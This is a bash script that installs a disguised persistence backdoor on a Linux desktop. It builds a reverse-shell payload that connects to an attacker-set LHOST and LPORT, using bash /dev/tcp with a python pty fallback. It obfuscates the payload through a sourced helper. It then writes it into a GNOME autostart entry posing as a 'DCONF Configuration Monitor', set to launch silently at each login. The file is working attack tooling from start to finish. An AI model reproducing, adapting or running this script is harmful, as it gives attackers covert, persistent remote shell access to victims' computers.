#!/usr/bin/env bash

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/obfuscate.sh"

LHOST="${LHOST:-}"
LPORT="${LPORT:-4444}"

# Name used for .desktop file and displayed in session managers
ENTRY_NAME="dconf-monitor"
ENTRY_DISPLAY_NAME="DCONF Configuration Monitor"
ENTRY_COMMENT="Monitors dconf database for schema changes"

info()  { echo "[*] $*"; }
success() { echo "[+] $*"; }
error()   { echo "[-] $*" >&2; }
warn() { echo "[!] $*"; }

# -- Preflight checks --
if [[ -z "$LHOST" ]]; then
    error "LHOST is not set. Export it before running:"
    error " Export LHOST=<ip address>"
    exit 1
fi


# -- Payload --
RAW_PAYLOAD="bash -c 'exec bash -i &>/dev/tcp/${LHOST}/${LPORT} <&1' 2>/dev/null || python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"${LHOST}\",${LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")' 2>/dev/null"

DECODER=$(ob_decoder "$RAW_PAYLOAD")


# -- Install --
AUTOSTART_DIR="$HOME/.config/autostart"

mkdir -p "$AUTOSTART_DIR"
DESKTOP_FILE="${AUTOSTART_DIR}/${ENTRY_NAME}.desktop"

if [[ -f "$DESKTOP_FILE" ]]; then
    warn "Autostart entry already exists at ${DESKTOP_FILE} — skipping"
    exit 0
fi

cat > "$DESKTOP_FILE" <<EOF
[Desktop Entry]
Type=Application
Name=${ENTRY_DISPLAY_NAME}
Comment=${ENTRY_COMMENT}
Exec=/bin/bash -c '( ${DECODER} ) &>/dev/null'
Icon=preferences-system
StartupNotify=false
Terminal=false
X-GNOME-Autostart-enabled=true
X-GNOME-Autostart-Delay=15
EOF
chmod 644 "$DESKTOP_FILE"

success "Autostart entry created at ${DESKTOP_FILE}"
info "Fires on next GUI login for user: $(whoami)"
info "To remove: rm ${DESKTOP_FILE}"
